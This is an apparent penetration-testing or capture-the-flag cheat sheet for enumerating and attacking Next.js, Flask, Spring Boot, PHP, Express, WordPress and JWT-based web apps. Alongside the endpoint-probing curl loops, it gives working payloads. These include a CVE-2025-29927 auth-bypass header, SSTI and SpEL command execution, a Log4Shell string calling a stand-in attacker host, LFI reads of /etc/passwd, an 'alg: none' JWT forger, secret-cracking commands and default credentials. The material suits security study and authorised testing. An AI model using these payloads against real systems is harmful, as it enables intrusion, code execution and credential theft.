# Technology-Specific Enumeration

## Table of Contents
1. [Next.js](#nextjs)
2. [Flask / Werkzeug](#flask--werkzeug)
3. [Spring Boot](#spring-boot)
4. [PHP](#php)
5. [Node.js / Express](#nodejs--express)
6. [WordPress](#wordpress)
7. [JWT Authentication](#jwt-authentication)
8. [General Web](#general-web)

---

## Next.js

**Detection:** `X-Powered-By: Next.js` header, `/_next/static/` paths

**Enumeration:**
```bash
# Version detection
curl -sI http://<TARGET>/ | grep -i "x-next"

# Build manifest (reveals all routes)
curl -s http://<TARGET>/_next/static/$(curl -s http://<TARGET>/ | \
  grep -oP '(?<=<!--)[a-zA-Z0-9]+(?=-->)' | head -1)/_buildManifest.js

# JS chunks (contain app logic, API endpoints, secrets)
curl -s http://<TARGET>/ | grep -oP '/_next/static/chunks/[^"]+' | sort -u

# For each chunk, search for secrets:
# grep -oiE '(api|admin|secret|password|token|key|flag)[^,]{0,50}'

# RSC Flight data (Server Components payload)
curl -H "RSC: 1" http://<TARGET>/

# Source maps (if available)
curl -sI http://<TARGET>/_next/static/chunks/<chunk>.js.map
```

**Known CVEs:**
- **CVE-2025-29927** (< 14.2.25 / < 15.2.3): Middleware auth bypass via
  `x-middleware-subrequest` header
  ```bash
  curl -H "x-middleware-subrequest: middleware" http://<TARGET>/admin
  curl -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" http://<TARGET>/admin
  ```

**Server Actions:** Next.js apps use Server Actions instead of traditional API routes.
Look for action IDs (40-char hex strings) in the HTML/JS and invoke via POST
with `Next-Action` header.

---

## Flask / Werkzeug

**Detection:** `Server: Werkzeug/<version>` header

**Enumeration:**
```bash
# Debug console (critical find!)
curl -s http://<TARGET>/console
curl -s http://<TARGET>/debug

# Common endpoints
for p in /admin /api /login /register /dashboard /flag /secret; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  [ "$CODE" != "404" ] && echo "[${CODE}] $p"
done
```

**Attack vectors:**
- **SSTI (Server-Side Template Injection):** If Jinja2 templates render user input
  ```
  {{7*7}}              → Returns 49 if vulnerable
  {{config.items()}}   → Dump Flask config
  {{''.__class__.__mro__[1].__subclasses__()}}  → RCE path
  ```
- **Debug PIN bypass:** If debug mode is on, calculate PIN from
  machine-id + MAC address + username
- **Secret key leak:** Allows session cookie forgery

---

## Spring Boot

**Detection:** Whitelabel error page, `X-Application-Context` header

**Enumeration:**
```bash
# Actuator endpoints (information goldmine)
for p in /actuator /actuator/env /actuator/health /actuator/info \
  /actuator/mappings /actuator/configprops /actuator/beans \
  /actuator/heapdump /actuator/logfile /actuator/trace; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  [ "$CODE" != "404" ] && echo "[${CODE}] $p"
done

# H2 Console
curl -s http://<TARGET>/h2-console
```

**Attack vectors:**
- **Actuator /env:** Exposes credentials, database URLs, API keys
- **Actuator /heapdump:** Memory dump → extract secrets with Eclipse MAT
- **SpEL injection:** `${T(java.lang.Runtime).getRuntime().exec('id')}`
- **Log4Shell (CVE-2021-44228):** `${jndi:ldap://attacker/exploit}`
- **Deserialization:** ysoserial payloads via insecure ObjectInputStream

---

## PHP

**Detection:** `X-Powered-By: PHP/<version>`, `.php` extensions

**Enumeration:**
```bash
# Info pages
for p in /info.php /phpinfo.php /test.php /admin.php /login.php \
  /wp-login.php /config.php /config.php.bak; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  [ "$CODE" != "404" ] && echo "[${CODE}] $p"
done
```

**Attack vectors:**
- **LFI (Local File Inclusion):**
  ```
  ?page=../../../etc/passwd
  ?page=php://filter/convert.base64-encode/resource=config.php
  ?page=php://input  (POST: <?php system('id'); ?>)
  ```
- **Type juggling:** `"0e123" == "0e456"` evaluates to true (magic hashes)
- **SQLi:** Test all input parameters with `'`, `"`, `1 OR 1=1`
- **File upload:** Bypass extension filters, upload PHP webshell

---

## Node.js / Express

**Detection:** `X-Powered-By: Express`

**Enumeration:**
```bash
# Common API patterns
for p in /api /api/v1 /api/users /api/admin /api/auth /api/login \
  /api/health /api/status /api/config /graphql; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  [ "$CODE" != "404" ] && echo "[${CODE}] $p"
done

# Package info
curl -s http://<TARGET>/package.json
```

**Attack vectors:**
- **Prototype pollution:** `{"__proto__":{"isAdmin":true}}`
- **NoSQL injection (MongoDB):** `{"username":{"$gt":""},"password":{"$gt":""}}`
- **SSRF:** If server fetches user-supplied URLs
- **Command injection:** Via child_process if user input reaches exec/spawn

---

## WordPress

**Detection:** `/wp-content/`, `/wp-admin/`, `<meta name="generator" content="WordPress">`

**Enumeration:**
```bash
# WPScan (if available)
wpscan --url http://<TARGET> --enumerate u,p,t

# Manual user enumeration
curl -s "http://<TARGET>/?author=1"
curl -s "http://<TARGET>/wp-json/wp/v2/users"

# Plugin enumeration
curl -s http://<TARGET>/ | grep -oP 'wp-content/plugins/[^/]+' | sort -u
```

---

## JWT Authentication

**Detection:** Base64 header.payload.signature in cookies or Authorization header

**Analysis workflow:**
```bash
# 1. Decode the JWT
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# 2. Check algorithm
echo '<token>' | cut -d. -f1 | base64 -d 2>/dev/null

# 3. Try none algorithm attack
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"

# 4. Brute force secret (if HS256)
# hashcat -a 0 -m 16500 <jwt> /usr/share/wordlists/rockyou.txt
# john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

**Attack vectors:**
- **None algorithm:** Server accepts unsigned token
- **Weak secret:** Brute force with rockyou.txt
- **Key confusion (RS256→HS256):** Sign with public key as HMAC secret
- **JWK/JKU injection:** Inject attacker-controlled key URL

---

## General Web

**Always check regardless of technology:**
```bash
# Response headers
curl -sI http://<TARGET>/ | grep -viE "^(date|content|cache|connection|vary)"

# Hidden in HTML comments
curl -s http://<TARGET>/ | grep -oP '<!--(?![\$\-/]).*?-->'

# Base64 content
curl -s http://<TARGET>/ | grep -oP '[A-Za-z0-9+/]{40,}={0,2}'

# Subdomains / virtual hosts
gobuster vhost -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt

# Default credentials (check after finding login)
# admin:admin, admin:password, root:root, test:test, guest:guest
```
